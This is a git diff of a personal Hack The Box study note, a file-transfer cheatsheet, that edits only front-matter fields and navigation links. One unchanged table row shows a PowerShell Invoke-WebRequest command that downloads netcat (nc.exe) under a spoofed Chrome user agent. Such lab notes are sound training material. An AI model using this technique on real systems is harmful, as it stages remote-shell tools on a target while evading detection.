@@ -3,8 +3,8 @@ title: "File Transfer Cheatsheet"
 tags:
   - cs/hacking
   - cs/hacking/htb
-programming-languages:
 created: 2022-07-13
+type: note
 ---
 # File Transfer Cheatsheet
 ---
@@ -23,6 +23,5 @@ created: 2022-07-13
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
 
 
-## Related
-- [File Transfers](notes/hacking/htb-file-transfers.md)
-- [Netcat](notes/hacking/netcat.md)
+> [!nav]
+> [[hacking-hub|Hacking]]
